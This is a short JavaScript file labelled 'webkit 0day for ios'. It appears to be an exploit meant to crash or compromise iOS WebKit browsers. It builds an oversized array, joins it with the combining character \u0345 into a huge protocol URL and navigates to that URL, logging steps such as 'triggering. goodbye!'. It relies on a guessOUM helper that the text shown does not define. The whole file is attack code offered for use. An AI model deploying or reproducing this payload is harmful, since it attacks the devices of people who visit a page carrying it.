/*
  protocol_array
  webkit 0day for ios
  GPLV2
*/

console.log("[*] init");
console.log("[*] guessing OUM");

var oumAndRefresh = guessOUM(screen.width * 2, screen.height * 2);
console.log("[*] done. oar is " + oumAndRefresh);

var refresh = oumAndRefresh[0];
var OUM = oumAndRefresh[1];

console.log("[*] may refresh if incorrect.");
try {
	var torhemp = (new Array(OUM)).toString();
}
catch (e) {
	console.log("[*] success! that caused an OUM.")
}

var acceptable = Math.floor(Math.floor(refresh / 4));

console.log("[*] acceptable = " + acceptable);
console.log("[*] initing pwnArray");

var pwnArray = new Array(0);
console.log("[*] done.");
console.log("[*] fastinit-ing");
pwnArray[acceptable] = 0;

console.log("[*] preparing...");
var pwnMeDaddy = location.protocol + (pwnArray.toString().split(",").join("\u0345"));

console.log("[*] triggering. goodbye!");
location.href = pwnMeDaddy;
console.log("[*] theoretically triggered. done");
